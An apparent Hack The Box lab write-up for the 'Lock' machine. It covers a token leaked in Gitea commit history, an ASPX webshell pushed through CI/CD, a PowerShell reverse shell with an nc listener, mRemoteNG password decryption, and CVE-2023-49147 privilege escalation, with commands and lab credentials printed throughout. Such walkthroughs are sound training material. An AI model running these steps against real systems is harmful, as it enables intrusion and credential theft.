---
icon: lock
---

# HTB-LOCK (VL)

<figure><img src="../../../../.gitbook/assets/image (168).png" alt=""><figcaption></figcaption></figure>

**Attack Flow Explanation :**

1. **Recon** → Found Gitea + Web Server
2. **Gitea** → Found exposed access token in git history
3. **Token** → Discovered private repository
4. **CI/CD** → Deployed webshell via git push → Got shell as ellen
5. **Enum** → Found mRemoteNG encrypted credentials
6. **Decrypt** → Got plaintext password for Gale.Dekarios
7. **RDP** → Lateral movement to gale user
8. **CVE** → PDF24 privilege escalation to SYSTEM
9. **Root** → Full system compromise

### Initial Reconnaissance

#### Nmap Scanning

```bash
nmap -sC -sV -oA nmap/lock 10.129.234.64
```

#### Web Server Headers Analysis

```bash
curl -I http://lock.htb/
```

**Output**: The HTTP response headers revealed the server is running ASP.NET

***

### Web Enumeration

#### Main Website (Port 80)

* Visited `http://lock.htb/`
* Standard web server with ASP.NET backend
* No immediate vulnerabilities found in web server response headers

#### Gitea Instance Discovery (Port 3000)

* Found Gitea instance running on `http://lock.htb:3000`
* Under **Explore** section, discovered public repository: `dev-scripts`

**Repository Analysis**

The `dev-scripts` repository contained:

* One Python script
* Two comments in commit history

**Python Script Analysis** (`repos.py`):

```python
import requests
import sys
import os

def format_domain(domain):
    if not domain.startswith(('http://', 'https://')):
        domain = 'https://' + domain
    return domain

def get_repositories(token, domain):
    headers = {
        'Authorization': f'token {token}'
    }
    url = f'{domain}/api/v1/user/repos'
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        return response.json()
    else:
        raise Exception(f'Failed to retrieve repositories: {response.status_code}')

def main():
    if len(sys.argv) < 2:
        print("Usage: python script.py <gitea_domain>")
        sys.exit(1)
    
    gitea_domain = format_domain(sys.argv[1])
    personal_access_token = os.getenv('GITEA_ACCESS_TOKEN')
    
    if not personal_access_token:
        print("Error: GITEA_ACCESS_TOKEN environment variable not set.")
        sys.exit(1)
    
    try:
        repos = get_repositories(personal_access_token, gitea_domain)
        print("Repositories:")
        for repo in repos:
            print(f"- {repo['full_name']}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
```

**Purpose**: This script connects to a Gitea instance using its API and lists all repositories owned by the authenticated user. It uses a personal access token stored in the environment variable `GITEA_ACCESS_TOKEN`.

***

### Git History Analysis

#### Examining Commit History

```bash
git log
```

Found 2 commits with interesting comments.

#### First Commit Analysis

```bash
git show 8b78e6c3024416bce55926faa3f65421a25d6370
```

**Critical Discovery**: Found the GITEA Access Token in the commit history:

```
GITEA_ACCESS_TOKEN=43ce39bb0bd6bc489284f2905f033ca467a6362f
```

***

### Repository Enumeration with Access Token

#### Using the Discovered Token

```bash
GITEA_ACCESS_TOKEN=43ce39bb0bd6bc489284f2905f033ca467a6362f python3 repos.py http://10.129.139.121:3000
```

**Result**: Discovered additional repository - `ellen.freeman/website.git`

#### Cloning the Target Repository

```bash
git clone http://43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.139.121:3000/ellen.freeman/website.git
```

**Success**: Gained access to the website's source code repository.

***

### CI/CD Pipeline Exploitation

#### Strategy

With access to the website's source code and confirmation that the CI/CD pipeline automatically redeploys whenever changes are pushed, the plan was to introduce a webshell.

#### Webshell Deployment

**Selecting Appropriate Webshell**

Since the response headers revealed the server was running **ASP.NET**, an **ASPX webshell** was chosen from: `https://github.com/grov/webshell/blob/master/webshell-LT.aspx`

**Repository Status Check**

```bash
git status
```

Confirmed Git was not yet tracking the webshell file.

**Staging and Committing the Webshell**

```bash
git add webshell.aspx
git commit -m "im a comment"
git push
```

**Accessing the Deployed Webshell**

Navigated to `http://lock.htb/webshell.aspx` - **Webshell successfully deployed!**

***

### Initial Access

#### Reverse Shell Generation

Used reverse shell payload from `https://www.revshells.com/` - PowerShell #3 option.

#### Establishing Listener

```bash
rlwrap nc -lvnp 4444
```

#### Executing Reverse Shell

Executed PowerShell reverse shell payload through the webshell interface.

**Result**: Successfully obtained remote shell as `ellen.freeman`

***

### Local Enumeration

#### User Directory Exploration

```bash
cd C:\Users
tree /f .
```

#### Configuration File Discovery

Found interesting configuration file:

```bash
type C:\Users\ellen.freeman\Documents\config.xml
```

**Discovery**: Found mRemoteNG configuration file containing:

* **Username**: `Gale.Dekarios`
* **Encrypted Password**: `TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==`

#### mRemoteNG Configuration Analysis

This XML file contained a saved RDP connection to the host `Lock` with encrypted credentials. mRemoteNG is a Windows remote connection manager that stores credentials for protocols like RDP, SSH, and VNC using AES encryption.

***

### Credential Decryption

#### Cloning Decryption Tool

```bash
git clone https://github.com/kmahyyg/mremoteng-decrypt.git
```

#### Decrypting Stored Credentials

```bash
python3 mremoteng_decrypt.py -rf config.xml
```

**Result**: Successfully decrypted password - `ty8wnW9qCKDosXo6`

#### Credential Validation

```bash
nxc smb 10.129.139.121 -u 'Gale.Dekarios' -p 'ty8wnW9qCKDosXo6' --generate-krb5-file /etc/krb5.conf
```

***

### RDP Access

#### Kerberos Configuration

Generated Kerberos configuration file for RDP access (required for xfreerdp3 to work properly).

#### RDP Connection Methods

**Method 1 (xfreerdp3)**:

```bash
xfreerdp3 /u:'Gale.Dekarios' /p:'ty8wnW9qCKDosXo6' /v:10.129.139.121 /size:1280x720 /tls:seclevel:0 /cert:ignore
```

**Method 2 (Alternative xfreerdp)**:

```bash
xfreerdp /u:gale.dekarios /p:ty8wnW9qCKDosXo6 /v:10.129.139.121:3389 +clipboard
```

**Success**: Gained RDP access to the target system!

***

### User Flag

🏁 **User flag captured** from Gale.Dekarios desktop.

***

### Privilege Escalation Analysis

#### Software Discovery

Found **PDF24 Launcher/Toolbox** installed on the system.

**Version Identification**

**Version**: 11.15.1 **Vulnerability Research**: Found this version vulnerable to CVE-2023-49147 **Reference**: https://creator.pdf24.org/changelog/en.html#v11.15.2

#### System Configuration

Changed view settings to show hidden folders and discovered hidden install directory at `C:\`

***

### CVE-2023-49147 Exploitation

#### Vulnerability Details

**CVE-2023-49147** is a privilege escalation vulnerability in PDF24 Creator's installer repair function.

**Attack Vector**: When executed with `msiexec.exe /fa`, the installer (running as SYSTEM) spawns `pdf24-PrinterInstall.exe`, which briefly opens a `cmd.exe` window and attempts to write to `C:\Program Files\PDF24\faxPrnInst.log`.

#### Exploitation Tools

Downloaded exploitation tools from: `https://github.com/googleprojectzero/symboliclink-testing-tools/releases` Transferred `SetOpLock.exe` to the target via RDP.

#### Opportunistic Lock Creation

```powershell
.\SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r
```

**Result**: File locked and cannot be accessed - process hanging achieved.

#### Triggering the Vulnerability

1. Opened `pdf24-creator` file
2. Started repair process
3. Right-clicked the top bar and selected **Properties**
4. The dialog showed configuration for `cmd.exe`
5. Clicked link for "legacy console mode"

#### Alternative Access Method

1. Opened with Firefox
2. Pressed **Ctrl+O**
3. Navigated to system directories

#### System Shell Access

Entered `cmd.exe` and pressed Enter.

**Success**: Gained shell with **NT AUTHORITY\SYSTEM** privileges! 💪

***

### Root Flag

🏁💀 **Root flag captured!**

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

***

### Attack Summary

#### Initial Access

* **Vector**: CI/CD Pipeline Abuse
* **Method**: Exploited Gitea access token found in commit history
* **Payload**: ASPX webshell deployment via git push
* **Shell**: PowerShell reverse shell as `ellen.freeman`

#### Lateral Movement

* **Discovery**: mRemoteNG configuration file with encrypted credentials
* **Tool**: mremoteng-decrypt for credential recovery
* **Access**: RDP connection as `Gale.Dekarios`
* **Credentials**: `Gale.Dekarios:ty8wnW9qCKDosXo6`

#### Privilege Escalation

* **Vulnerability**: CVE-2023-49147 in PDF24 Creator 11.15.1
* **Technique**: Opportunistic lock on log file during repair process
* **Tool**: SetOpLock.exe from Google Project Zero
* **Result**: SYSTEM-level command shell access

***

### Key Learning Points

1. **Git History Security**: Sensitive information in commit history can be exploited
2. **CI/CD Security**: Automatic deployment pipelines can be abused for code execution
3. **Configuration Files**: Encrypted credentials in config files may be recoverable
4. **Software Vulnerabilities**: Known CVEs in installed software provide privilege escalation paths
5. **Opportunistic Locks**: Advanced Windows exploitation techniques for process manipulation

***

### Mitigation Recommendations

1. **Repository Security**: Implement proper secret management and audit commit history
2. **CI/CD Hardening**: Restrict deployment permissions and implement code review processes
3. **Credential Management**: Use secure credential storage solutions instead of local config files
4. **Patch Management**: Maintain up-to-date software versions and monitor CVE databases
5. **Process Monitoring**: Implement monitoring for unusual process behaviors and file access patterns

***

### References

* [CVE-2023-49147 – PDF24 Creator Privilege Escalation (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-49147)
* [PDF24 Changelog – fix in version 11.15.2](https://creator.pdf24.org/changelog/en.html#v11.15.2)
* [Packet Storm Security – PDF24 Privilege Escalation](https://packetstormsecurity.com/)
* [Microsoft Docs – Opportunistic Locks](https://docs.microsoft.com/en-us/windows/win32/fileio/opportunistic-locks)
* [Google Project Zero Symbolic Link Testing Tools](https://github.com/googleprojectzero/symboliclink-testing-tools)
* [mRemoteNG Decrypt Tool](https://github.com/kmahyyg/mremoteng-decrypt)

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
